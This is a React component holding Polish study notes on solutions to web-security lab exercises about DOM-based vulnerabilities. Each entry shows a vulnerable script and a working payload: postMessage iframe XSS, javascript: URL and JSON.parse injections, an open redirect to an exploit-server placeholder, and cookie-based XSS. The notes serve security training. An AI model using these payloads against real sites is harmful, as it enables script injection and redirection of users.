const DOMbasedVulnerabilities = () =>{
    return(
        <details>
            <summary>DOM-based vulnerabilities</summary>

            <details>
                <summary>DOM XSS przy użyciu wiadomości internetowych</summary>
                <p>Na stronie występuje <span className="important">{`<script>`}</span></p>
                <p><span className="important">{`window.addEventListener('message', function(e) {`}</span></p>
                <p className="tab-1"><span className="important">{`document.getElementById('ads').innerHTML = e.data;`}</span></p>
                <p><span className="important">{`})`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`}</p>
                </div>
            </details>

            <details>
                <summary>DOM XSS przy użyciu wiadomości internetowych i adresu URL JavaScript</summary>
                <p>Na stronie występuje <span className="important">{`<script>`}</span></p>
                <p><span className="important">{`window.addEventListener('message', function(e) {`}</span></p>
                <p className="tab-1"><span className="important">{`var url = e.data;`}</span></p>
                <p className="tab-1"><span className="important">{`if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {`}</span></p>
                <p className="tab-2"><span className="important">{`location.href = url;`}</span></p>
                <p className="tab-1"><span className="important">{`}`}</span></p>
                <p><span className="important">{`}, false)`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`}</p>
                </div>
            </details>

            <details>
                <summary>DOM XSS przy użyciu komunikatów internetowych i JSON.parse</summary>
                <p>Na stronie występuje <span className="important">{`<script>`}</span></p>
                <p><span className="important">{`window.addEventListener('message', function(e) {`}</span></p>
                <p className="tab-1"><span className="important">{`var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;`}</span></p>
                <p className="tab-1"><span className="important">{`document.body.appendChild(iframe);`}</span></p>
                <p className="tab-1">{`try {`}</p>
                <p className="tab-2"><span className="important">{`d = JSON.parse(e.data);`}</span></p>
                <p className="tab-1">{`} catch(e) {`}</p>
                <p className="tab-2">{`break;`}</p>
                <p className="tab-1">{`}`}</p>
                <p className="tab-1">{`switch(d.type) {`}</p>
                <p className="tab-2">{`case "page-load":`}</p>
                <p className="tab-3">{`ACMEplayer.element.scrollIntoView();`}</p>
                <p className="tab-3">{`break;`}</p>
                <p className="tab-2"><span className="important">{`case "load-channel":`}</span></p>
                <p className="tab-3"><span className="important">{`ACMEplayer.element.src = d.url;`}</span></p>
                <p className="tab-2">{`case "player-height-changed":`}</p>
                <p className="tab-3">{`ACMEplayer.element.style.width = d.width + "px";`}</p>
                <p className="tab-3">{`ACMEplayer.element.style.height = d.height + "px";`}</p>
                <p className="tab-3">{`break;`}</p>
                <p className="tab-1">{`}`}</p>
                <p>{`}, false)`}</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`}</p>
                </div>
            </details>
            
            <details>
                <summary>Przekierowanie otwarte oparte na DOM</summary>
                <p>Na stronie blog występuje</p>
                <p><span className="important">{`<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`}</p>
                </div>
            </details>
            
            <details>
                <summary>Manipulacja plikami cookie oparta na DOM</summary>
                <p>Na stronie występuje <span className="important">{`<script>`}</span></p>
                <p><span className="important">{`document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`}</p>
                </div>
            </details>
        </details>
    )
}

export default DOMbasedVulnerabilities;